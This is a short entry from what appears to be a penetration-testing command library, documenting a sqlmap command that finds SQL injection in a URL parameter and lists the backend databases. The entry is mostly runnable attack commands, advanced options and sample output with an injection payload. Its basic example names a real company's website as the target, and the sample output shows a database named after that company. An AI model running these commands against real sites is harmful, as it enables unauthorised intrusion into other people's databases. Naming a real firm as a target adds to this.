---
data: 'sqlmap -u "http://target.com/vulnerable?param=1" --dbs --batch'
tags:
  - sql-injection
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.465Z'
id: aeace6d8-4ea2-4341-94c9-53e73df28c2b
verified: false
validated: true
submitted: true
---
# sqlmap-enumerate-databases

## Command

```bash
sqlmap -u "http://target.com/vulnerable?param=1" --dbs --batch
```

## Description

This command uses SQLMap to test a URL parameter for SQL injection vulnerabilities and, if successful, enumerate all available database names on the backend server. It is ideal for error-based or other injection types in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with vulnerable parameter | Yes |
| `--dbs` | Enumerate DBMS databases | Yes |
| `--batch` | Non-interactive mode, auto-accepts defaults | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://sony-website.com/███████?id=1" --dbs
```

### Advanced Usage

```bash
sqlmap -u "http://target.com/page?id=1" --dbs --level=3 --risk=2 --batch
```

## Expected Output

Successful execution shows vulnerability details followed by a list of databases, e.g.,:

```
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1' AND 1234=1234--

Available databases [2]:
[*] sony_main
[*] information_schema
```

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-with-SQLMap]]
